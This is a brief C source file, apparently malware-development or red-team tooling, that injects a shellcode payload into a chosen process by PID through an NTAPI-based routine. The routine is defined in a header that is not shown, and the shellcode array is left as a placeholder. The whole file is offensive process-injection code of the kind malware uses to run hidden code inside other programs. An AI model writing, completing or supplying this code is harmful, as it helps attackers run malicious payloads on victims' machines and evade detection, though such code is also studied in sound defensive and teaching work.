#include "headers.h"

#pragma section(".text")
__declspec(allocate(".text")) const unsigned char payload[] = {
    // add shellcode here
};

int main(int argc, char *argv[]) {

  if (argc < 2) {
    warn("usage: \"%s\" [PID]", argv[0]);
    return EXIT_FAILURE;
  }

  if (!ntapiInject(atoi(argv[1]), payload, sizeof(payload))) {
    warn("injection with NTAPI failed, exiting...");
    return EXIT_FAILURE;
  }

  okay("successfully injected process with NTAPI!");
  return EXIT_SUCCESS;
}
